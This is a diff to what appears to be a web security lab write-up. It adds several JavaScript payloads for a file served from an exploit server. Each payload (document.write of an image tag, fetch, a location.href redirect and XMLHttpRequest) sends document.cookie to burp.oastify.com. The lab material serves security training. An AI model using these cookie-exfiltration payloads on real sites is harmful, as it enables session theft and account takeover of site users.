@@ -6,8 +6,17 @@
 ```
   go to the **exploit server** ->
 
-  in "file": /recources/js/tracking.js
-  in "body": document.write('<img src="http://burp.oastify.com?c='+document.cookie+'" />')
+  in **"file"**: /recources/js/tracking.js
+  in **"body"**: document.write('<img src="http://burp.oastify.com?c='+document.cookie+'" />')
+
+  or
+  fetch('http://burp.oastify.com?c=' + document.cookie, { mode: 'no-cors' });
+  location.href = 'http://burp.oastify.com?c=' + document.cookie;
+```
+```
+  var xhr = new XMLHttpRequest();
+  xhr.open('GET', 'http://burp.oastify.com?c=' + document.cookie, true);
+  xhr.send();
 ```
 ![dsx](https://github.com/user-attachments/assets/e3d70422-eda9-40e9-86e4-eee50eb135e3)
 
